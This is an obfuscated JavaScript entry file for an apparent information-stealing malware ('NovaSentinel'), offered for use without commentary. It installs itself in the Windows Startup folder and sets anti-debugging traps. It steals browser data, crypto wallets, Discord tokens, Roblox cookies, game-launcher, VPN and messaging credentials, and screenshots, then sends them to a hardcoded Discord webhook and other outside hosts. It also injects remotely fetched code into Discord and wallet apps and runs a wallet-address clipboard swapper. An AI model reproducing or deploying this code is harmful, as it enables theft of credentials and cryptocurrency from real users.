const _0x2fc0a3 = require('./utils/admin'),
  _0x5d38da = require('./utils/browsers'),
  _0x584d5c = require('./utils/clipper'),
  _0x622f57 = require('./utils/core'),
  _0x56be9f = require('./utils/crypto'),
  _0x559b4a = require('./utils/discord'),
  _0x16fc6a = require('./utils/files'),
  { upload: _0x4e7ca6 } = require('./utils/gofile'),
  _0x5c0b64 = require('./utils/infos'),
  _0x3e9da6 = require('./utils/injection'),
  _0x2f0569 = require('./utils/antidebug'),
  _0x5d1dc6 = require('./utils/save'),
  _0x538aeb = require('./utils/startup.js'),
  { stat: _0x2fa429 } = require('./utils/stats'),
  _0x5d9c28 = require('fs'),
  _0x2b7008 = require('axios'),
  _0x3a0d06 = require('form-data'),
  _0x59f3c0 = require('./utils/roblox')
minecraft = require('./utils/minecraft')
fake_error = require('./utils/fake_error')
let _0x2d4cbb = {
  webhook:
    'https://discord.com/api/webhooks/1134509281287340122/ltP5jLHiFUPd3Y0ml16_jhcPvkHNYJU54NpxvhLcl5_HIu5L5RP_j850OpBY3_YqTOHp',
  api: 'https://hawkish.eu/grabber/hooks/mFIvyHDvIJrSuzHzJGqegjHUqbiq',
  DoINeedTo_BlockDebug: 'yes',
  DoINeedTo_GetGames: 'yes',
  DoINeedTo_GetLaunchers: 'yes',
  DoINeedTo_Inject: 'yes',
  DoINeedTo_GetClients: 'yes',
  DoINeedTo_GetWallets: 'yes',
  DoINeedTo_GetVPN: 'yes',
  DoINeedTo_GetSysInfo: 'yes',
  DoINeedTo_GetSocialAPP: 'yes',
  DoINeedTo_GetBrowsers: 'yes',
  DoINeedTo_Startup: 'yes',
  DoINeedTo_FakeError: 'no',
  DiscordInjectionURL:
    'https://raw.githubusercontent.com/FalseKSCH/Cat-MyInject/main/index.js',
  ExodusInjectionURL:
    'https://raw.githubusercontent.com/FalseKSCH/Exodus-Injection/main/index.js',
  AtomicInjectionURL:
    'https://raw.githubusercontent.com/FalseKSCH/Atomic-Injection/main/vendors.c1828ed4edca9a5f556f.js',
  DoINeedTo_SwapWallet: {
    active: 'no',
    ltc_address: '',
    xlm_address: '',
    eth_address: '',
    dash_address: '',
    bch_address: '',
    btc_address: '',
    xrp_address: '',
    neo_address: '',
    doge_address: '',
  },
}
async function _0x3df781() {
  const _0x327073 = (function () {
      let _0x4a7469 = true
      return function (_0x431cda, _0x3f3f0f) {
        const _0x58d033 = _0x4a7469
          ? function () {
              if (_0x3f3f0f) {
                const _0x42cec1 = _0x3f3f0f.apply(_0x431cda, arguments)
                return (_0x3f3f0f = null), _0x42cec1
              }
            }
          : function () {}
        return (_0x4a7469 = false), _0x58d033
      }
    })(),
    _0x53f251 = _0x327073(this, function () {
      return _0x53f251
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x53f251)
        .search('(((.+)+)+)+$')
    })
  _0x53f251()
  const _0x147b54 = (function () {
    let _0xddf93f = true
    return function (_0x11be8a, _0x2683b7) {
      const _0x29e42f = _0xddf93f
        ? function () {
            if (_0x2683b7) {
              const _0x266cd7 = _0x2683b7.apply(_0x11be8a, arguments)
              return (_0x2683b7 = null), _0x266cd7
            }
          }
        : function () {}
      return (_0xddf93f = false), _0x29e42f
    }
  })()
  ;(function () {
    _0x147b54(this, function () {
      const _0xda4a67 = new RegExp('function *\\( *\\)')
      const _0x5bff94 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
      const _0x39dc0b = _0x5a606a('init')
      !_0xda4a67.test(_0x39dc0b + 'chain') ||
      !_0x5bff94.test(_0x39dc0b + 'input')
        ? _0x39dc0b('0')
        : _0x5a606a()
    })()
  })()
  const _0x508e80 = (function () {
      let _0x51b5fa = true
      return function (_0x4dca0f, _0x1273dd) {
        const _0x436e81 = _0x51b5fa
          ? function () {
              if (_0x1273dd) {
                const _0x24821a = _0x1273dd.apply(_0x4dca0f, arguments)
                return (_0x1273dd = null), _0x24821a
              }
            }
          : function () {}
        return (_0x51b5fa = false), _0x436e81
      }
    })(),
    _0x1787e3 = _0x508e80(this, function () {
      let _0x3f286e
      try {
        const _0x20618c = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        _0x3f286e = _0x20618c()
      } catch (_0x26e869) {
        _0x3f286e = window
      }
      const _0x11b4a6 = (_0x3f286e.console = _0x3f286e.console || {}),
        _0x3b50a2 = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
      for (let _0x27e06 = 0; _0x27e06 < _0x3b50a2.length; _0x27e06++) {
        const _0x12f9f2 = _0x508e80.constructor.prototype.bind(_0x508e80),
          _0x4c3065 = _0x3b50a2[_0x27e06],
          _0x5b34a1 = _0x11b4a6[_0x4c3065] || _0x12f9f2
        _0x12f9f2['__proto__'] = _0x508e80.bind(_0x508e80)
        _0x12f9f2.toString = _0x5b34a1.toString.bind(_0x5b34a1)
        _0x11b4a6[_0x4c3065] = _0x12f9f2
      }
    })
  _0x1787e3()
  let _0x2a3535 = ''
  try {
    _0x5d9c28.copyFileSync(
      process.cwd() +
        '\\' +
        process.argv0.split('\\')[process.argv0.split('\\').length - 1],
      process.env.APPDATA +
        '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe'
    )
  } catch (_0x3b7975) {}
  const _0x5eba96 = _0x2d4cbb.webhook
  await _0x5d1dc6.Init()
  const {
    disk: _0x137c83,
    ram: _0x426d70,
    uid: _0x1abd2e,
    cpucount: _0x7d2dab,
    OS: _0x3e3497,
    cpu: _0x392e9e,
    GPU: _0x2fb242,
    windowskey: _0x56da63,
    windowsversion: _0x1ef9db,
  } = await _0x622f57.getInfo()
  const {
      ip: _0x1d90d0,
      hostname: _0x4c5eb0,
      city: _0x295bc8,
      region: _0x23c380,
      country: _0x338a6b,
      loc: _0x15018a,
      org: _0x33c34a,
      postal: _0x39fbaa,
      timezone: _0x4f997d,
    } = await _0x622f57.getPublicIp(),
    _0x150664 = process.env.userprofile.split('\\')[2],
    _0x4a6645 = 'https://www.google.com/maps/search/google+map++' + _0x15018a
  _0x2f0569.DoNoDebugNegger(
    _0x2d4cbb.DoINeedTo_BlockDebug,
    _0x1d90d0,
    _0x137c83,
    _0x426d70,
    _0x1abd2e,
    _0x7d2dab,
    _0x3e3497,
    _0x392e9e,
    _0x2fb242,
    _0x56da63,
    _0x1ef9db
  )
  fake_error.error(_0x2d4cbb.DoINeedTo_FakeError)
  _0x2fc0a3.NovaSentinelWinSCP(_0x2d4cbb.DoINeedTo_GetClients)
  _0x16fc6a.NovaSentinelBattle(_0x2d4cbb.DoINeedTo_GetLaunchers)
  _0x16fc6a.NovaSentinelEpicGame(_0x2d4cbb.DoINeedTo_GetLaunchers)
  _0x16fc6a.NovaSentinelSteam(_0x2d4cbb.DoINeedTo_GetLaunchers)
  _0x16fc6a.NovaSentinelPidgin(_0x2d4cbb.DoINeedTo_GetSocialAPP)
  _0x16fc6a.NovaSentinelProton(_0x2d4cbb.DoINeedTo_GetVPN)
  _0x16fc6a.NovaSentinelNordVPN(_0x2d4cbb.DoINeedTo_GetVPN)
  _0x16fc6a.NovaSentinelOpenVPN(_0x2d4cbb.DoINeedTo_GetVPN)
  _0x16fc6a.NovaSentinelRiotGame(_0x2d4cbb.DoINeedTo_GetLaunchers)
  await _0x5c0b64.getSysteminformations(
    _0x2d4cbb.DoINeedTo_GetSysInfo,
    _0x1d90d0,
    _0x4c5eb0,
    _0x137c83,
    _0x426d70,
    _0x1abd2e,
    _0x7d2dab,
    _0x3e3497,
    _0x392e9e,
    _0x2fb242,
    _0x56da63,
    _0x1ef9db
  )
  _0x5c0b64.takeScreenshotAndSave(_0x2d4cbb.DoINeedTo_GetSysInfo)
  _0x16fc6a.NovaSentinelTelegram(_0x2d4cbb.DoINeedTo_GetSocialAPP)
  _0x16fc6a.NovaSentinelTox(_0x2d4cbb.DoINeedTo_GetSocialAPP)
  await _0x16fc6a.NovaSentinelSimple()
  await _0x59f3c0.NovaSentinelGetRoblox(_0x2d4cbb.DoINeedTo_GetGames)
  _0x56be9f.NovaSentinelColds(_0x2d4cbb.DoINeedTo_GetWallets)
  _0x56be9f.NovaSentinelExtensions(_0x2d4cbb.DoINeedTo_GetWallets)
  try {
    const _0x471f4d = await _0x5d38da.NovaSentinelBrowsers(
        _0x2d4cbb.DoINeedTo_GetBrowsers
      ),
      _0x49f1c3 = await _0x56be9f.NovaSentinelMetamask(_0x471f4d)
    _0x56be9f.exodusDecrypt(_0x2d4cbb.DoINeedTo_GetWallets, _0x471f4d)
    _0x2fa429.AddPassphrase(_0x49f1c3)
    _0x59f3c0.ParseAndSendRoblox(_0x2d4cbb.DoINeedTo_GetGames)
  } catch (_0x42bc33) {}
  const _0x10fd0a = await _0x5d1dc6.zipResult()
  var _0x39889b = new _0x3a0d06(),
    _0x278a6b = new _0x3a0d06()
  _0x2a3535 = await _0x4e7ca6(_0x10fd0a)
  _0x5d9c28.statSync(_0x10fd0a).size / 1000 / 1000 > 10
    ? _0x39889b.append(
        'payload_json',
        _0x2fa429.Build(
          _0x150664,
          _0x1d90d0,
          _0x4c5eb0,
          _0x295bc8,
          _0x23c380,
          _0x338a6b,
          _0x4a6645,
          _0x33c34a,
          _0x39fbaa,
          _0x4f997d,
          _0x137c83,
          _0x426d70,
          _0x1abd2e,
          _0x7d2dab,
          _0x3e3497,
          _0x392e9e,
          _0x2fb242,
          _0x56da63,
          _0x1ef9db,
          _0x2a3535
        )
      )
    : (_0x39889b.append(
        'payload_json',
        _0x2fa429.Build(
          _0x150664,
          _0x1d90d0,
          _0x4c5eb0,
          _0x295bc8,
          _0x23c380,
          _0x338a6b,
          _0x4a6645,
          _0x33c34a,
          _0x39fbaa,
          _0x4f997d,
          _0x137c83,
          _0x426d70,
          _0x1abd2e,
          _0x7d2dab,
          _0x3e3497,
          _0x392e9e,
          _0x2fb242,
          _0x56da63,
          _0x1ef9db,
          ''
        )
      ),
      _0x278a6b.append('file', _0x5d9c28.createReadStream(_0x10fd0a)))
  try {
    _0x2b7008.all([
      await _0x2b7008({
        url: _0x5eba96,
        method: 'POST',
        headers: { ..._0x39889b.getHeaders() },
        data: _0x39889b,
      }),
    ])
    _0x2b7008.all([
      await _0x2b7008({
        url: _0x5eba96,
        method: 'POST',
        headers: { ..._0x278a6b.getHeaders() },
        data: _0x278a6b,
      }),
    ])
  } catch (_0x12645d) {}
  const _0x176547 = await _0x559b4a.NovaSentinelDiscord()
  var _0x3233d1 = []
  for (let _0xd19c = 0; _0xd19c < _0x176547.length; _0xd19c++) {
    const _0x304d17 = _0x176547[_0xd19c]
    _0x3233d1.push(
      _0x559b4a.embed(
        _0x304d17.username,
        _0x304d17.tag,
        _0x304d17.id,
        _0x304d17.nitro,
        _0x304d17.badges,
        _0x304d17.billings,
        _0x304d17.email,
        _0x304d17.phone,
        _0x304d17.token,
        _0x304d17.avatar
      )
    )
    const _0x376fee = await _0x559b4a.embedbis(_0x304d17.token),
      _0x28c32f = await _0x559b4a.embedguild(_0x304d17.token)
    _0x3233d1.push(_0x28c32f)
    _0x3233d1.push(_0x376fee)
  }
  try {
    await _0x2b7008({
      url: _0x5eba96,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      data: JSON.parse(_0x559b4a.compile(_0x3233d1.slice(0, 10))),
    })
  } catch (_0x1a8368) {}
  let _0xd92962 = []
  try {
    const _0x1bf3a2 = await _0x59f3c0.sendRoblox(_0x2d4cbb.DoINeedTo_GetGames)
    if (_0x1bf3a2.length > 0) {
      _0xd92962 = await Promise.all(
        _0x1bf3a2.map(async (_0x3ad34f) => {
          let {
            UserName: _0x5c8583,
            RobuxBalance: _0x114a15,
            ThumbnailUrl: _0x42791d,
            IsAnyBuildersClubMember: _0x41d04c,
            IsPremium: _0x3fe7b7,
            friendscount: _0x67dd75,
            cookies: _0x394de9,
          } = _0x3ad34f
          const _0xc8153f = await _0x2b7008.post(
            'https://dpaste.com/api/',
            'content=' + encodeURIComponent(_0x394de9),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
          )
          const _0x37e05a = _0xc8153f.headers.location
          return _0x59f3c0.embed(
            _0x5c8583,
            _0x114a15,
            _0x42791d,
            _0x41d04c,
            _0x3fe7b7,
            _0x67dd75,
            _0x37e05a
          )
        })
      )
      await _0x2b7008({
        url: _0x5eba96,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        data: JSON.parse(_0x59f3c0.compile(_0xd92962.slice(0, 10))),
      })
    }
  } catch (_0x20c15f) {}
  await minecraft.finduid(_0x5eba96)
  _0x3e9da6.exodusInjection(
    _0x2d4cbb.DoINeedTo_Inject,
    _0x5eba96,
    _0x2d4cbb.ExodusInjectionURL
  )
  _0x3e9da6.pwnBetterDiscord(_0x2d4cbb.DoINeedTo_Inject)
  _0x3e9da6.BypassDiscordTokenProtector(_0x2d4cbb.DoINeedTo_Inject)
  _0x3e9da6.inject(
    _0x2d4cbb.DoINeedTo_Inject,
    _0x5eba96,
    _0x2d4cbb.api,
    _0x2d4cbb.DiscordInjectionURL,
    _0x2a3535
  )
  _0x538aeb.copyScriptToStartup(_0x2d4cbb.DoINeedTo_Startup)
  _0x584d5c.walletClipper(_0x2d4cbb.DoINeedTo_SwapWallet)
}
_0x3df781()
function _0x5a606a(_0x3c5de1) {
  function _0x47e51b(_0x4fd11e) {
    if (typeof _0x4fd11e === 'string') {
      return function (_0x3583d5) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x4fd11e / _0x4fd11e).length !== 1 || _0x4fd11e % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x47e51b(++_0x4fd11e)
  }
  try {
    if (_0x3c5de1) {
      return _0x47e51b
    } else {
      _0x47e51b(0)
    }
  } catch (_0x2d5c62) {}
}
